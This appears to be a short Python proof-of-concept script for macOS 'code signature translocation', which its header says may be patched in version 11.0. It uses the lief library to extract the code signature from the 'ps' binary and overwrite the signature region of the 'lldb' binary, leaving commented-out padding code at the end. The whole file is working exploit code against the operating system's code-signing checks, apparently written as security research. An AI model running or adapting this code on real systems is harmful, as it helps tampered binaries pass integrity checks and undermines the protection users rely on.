#Messy PoC for code signature translocation. "Patched" (?) in 11.0
import lief, sys



app = lief.parse('ps')
f = open('ps', 'rb')
print (app.code_signature)
print ("Size of Code Signature: %s" % app.code_signature.data_size)
f.seek(app.code_signature.data_offset)
codeSig = f.read(app.code_signature.data_size)
with open("code.sig", "wb+") as sigOut:
    sigOut.write(codeSig)
    print("Wrote code signature to code.sig :)")

app2 = lief.parse('lldb')
f2 = open('lldb', 'r+b')
print (app2.code_signature)
print ("Size of Code Signature: %s" % app2.code_signature.data_size)
print ("Replacing code signature at %s" % hex(app2.code_signature.data_offset))

f2.seek(app2.code_signature.data_offset)
f2.write(codeSig)
print("Wrote code signature.")
f2.close()



#print (codeSig)
#padSize = 704
#print ("Adding %s bytes of NULL padding." % padSize)
#padding = b'\x00' * padSize
#codeSigPadded = codeSig + padding
#f2.seek(app2.code_signature.data_offset + app2.code_signature.data_size)
#f2.write(padding)
